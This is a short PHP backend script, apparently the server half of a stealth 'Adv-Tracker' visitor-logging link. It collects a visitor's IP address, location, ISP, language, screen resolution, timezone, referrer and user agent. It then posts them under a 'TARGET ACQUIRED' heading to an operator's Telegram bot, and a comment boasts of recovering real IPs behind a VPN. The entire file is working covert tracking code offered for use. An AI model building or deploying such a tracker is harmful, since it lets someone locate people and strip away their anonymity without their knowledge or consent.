<?php
/**
 * Adv-Tracker Backend
 * Mode: Stealth / Secure
 */

header('Content-Type: application/json');

// --- KONFIGURASI ---
$BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Ganti dengan token bot Anda
$CHAT_ID   = 'YOUR_CHAT_ID';   // Ganti dengan chat id Anda

// Ambil input JSON
$raw = file_get_contents('php://input');
$data = json_decode($raw, true);

if (!$data) {
    http_response_code(400);
    echo json_encode(["status" => "error"]);
    exit;
}

// IP Real dari Server (Kadang Client kirim IP VPN, Server ambil IP asli koneksi)
$server_ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date("D, d M Y | H:i:s T");

// --- FORMAT PESAN TELEGRAM ---
$msg  = "<b>🚨 TARGET ACQUIRED</b>\n";
$msg .= "────────────────────\n";
$msg .= "<b>📍 GEOLOCATION</b>\n";
$msg .= "├ <b>IP:</b> <code>$server_ip</code>\n";
$msg .= "├ <b>Loc:</b> " . ($data['city'] ?? 'Unknown') . ", " . ($data['country'] ?? 'Unknown') . "\n";
$msg .= "└ <b>ISP:</b> " . ($data['isp'] ?? 'Unknown') . "\n\n";

$msg .= "<b>🖥️ SYSTEM ENVIRONMENT</b>\n";
$msg .= "├ <b>Language:</b> " . ($data['lang'] ?? 'Unknown') . "\n";
$msg .= "├ <b>Resolution:</b> " . ($data['res'] ?? 'Unknown') . "\n";
$msg .= "└ <b>Timezone:</b> " . ($data['tz'] ?? 'Unknown') . "\n\n";

$msg .= "<b>🔗 SOURCE & AGENT</b>\n";
$msg .= "├ <b>Referer:</b> " . ($data['ref'] ?? 'Direct') . "\n";
$msg .= "└ <b>Agent:</b> <code>" . ($data['ua'] ?? 'Unknown') . "</code>\n";
$msg .= "────────────────────\n";
$msg .= "<b>📅 AT:</b> <code>$timestamp</code>";

// --- KIRIM KE TELEGRAM ---
$url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage";
$options = [
    'http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query([
            'chat_id' => $CHAT_ID,
            'text' => $msg,
            'parse_mode' => 'HTML',
            'disable_web_page_preview' => true
        ]),
    ],
];

$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);

if ($result) {
    echo json_encode(["status" => "success"]);
} else {
    echo json_encode(["status" => "failed"]);
}
